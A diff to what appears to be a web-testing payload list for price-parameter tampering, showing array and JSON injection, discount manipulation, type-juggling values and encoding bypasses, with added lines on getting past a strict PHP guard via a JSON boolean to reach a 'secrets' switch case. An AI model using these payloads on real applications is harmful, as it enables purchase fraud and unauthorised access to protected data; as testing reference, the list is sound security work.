@@ -54,12 +54,18 @@ price[]=1&price[]=133700  (Array injection)
 price={"amount":1,"currency":"USD"}  (JSON injection)
 price=1337.00&discount=100  (Discount manipulation)
 
-# Type juggling
+# Type juggling (values)
 price="1"  (String)
 price=true  (Boolean)
 price=null  (Null)
 price=undefined  (Undefined)
 price=NaN  (Not a Number)
+
+# Type juggling (PHP switch bypass)
+# When strict === guards a value but switch() uses loose ==:
+# Send JSON boolean true to bypass === guard and match first non-empty case
+# {"type": true}  — bypasses ($x === 'secrets') but matches case 'secrets' in switch
+# Also try: 0 (matches "0" or empty string), null, [] (array)
 
 # Encoding bypasses
 price=%31  (URL encoded "1")
